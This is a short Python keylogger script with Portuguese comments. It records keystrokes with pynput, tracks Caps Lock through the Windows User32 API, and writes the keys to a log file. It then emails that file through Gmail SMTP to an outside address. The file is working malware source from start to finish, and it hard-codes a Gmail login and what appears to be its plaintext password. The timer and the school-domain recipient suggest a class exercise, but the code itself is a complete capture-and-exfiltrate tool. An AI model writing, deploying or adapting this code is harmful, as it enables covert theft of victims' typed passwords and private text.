from pynput import keyboard
from threading import Timer
import smtplib
from email.message import EmailMessage
import ctypes
import os


def get_capslock_state():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)


def update_txt_file(key):
    key_string = str(key).replace("'", "")
    do_nothing = 1

    with open(file_path, 'a') as file:
        # Armazena o estado do capslock
        caps_lock_state = get_capslock_state()

        # Atualiza a variável do estado do capslock
        if key_string == 'Key.caps_lock':
            if caps_lock_state == 0:
                caps_lock_state == 1
            elif caps_lock_state == 1:
                caps_lock_state == 0
        # Troca Key.space por ' '
        elif (key_string == 'Key.space'):
            file.write(' ')
        # Apaga um caractere
        elif key_string == 'Key.backspace':
            with open(file_path, 'rb+') as file:
                file_size = os.path.getsize(file_path)
                if file_size > 0:
                    file.seek(-1, os.SEEK_END)
                    file.truncate()
        # Impede a adição da keyword da tecla Shift
        elif key_string.find('Key.shift') != -1:
            do_nothing = 1
        # Representa de forma mais clara o restante das teclas que começam com Key
        elif key_string.find('Key') != -1:
            file.write('(' + key_string + ')')
        # Se for uma letra ou número, adiciona o caractere normalmente
        else:
            if caps_lock_state == 0:
                file.write(key_string)
            elif caps_lock_state == 1:
                file.write(key_string.upper())


def on_press(key):
    update_txt_file(key)


def send_email(email, password, receiver, subject='(no subject)'):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['To'] = receiver

    with open(file_path, "rb") as myfile:
        file_data = myfile.read()
        file_name = myfile.name
        msg.add_attachment(file_data,
                           maintype="application",
                           subtype='json',
                           filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(email, password)
        server.send_message(msg)


x = False  # Value to if held
file_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json

print("[+] Keylogger funcionando com sucesso!")
print(f"[!] Salvando dados no diretório '{file_path}'")

with keyboard.Listener(on_press=on_press) as listener:
    Timer(8, listener.stop).start()
    listener.join()

print("[-] Keylogger finalizado!")

try:
    send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
               'd.lima@aln.senaicimatec.edu.br', 'keylogger')
except:
    print("Couldn't send email")
else:
    print("Email sent!")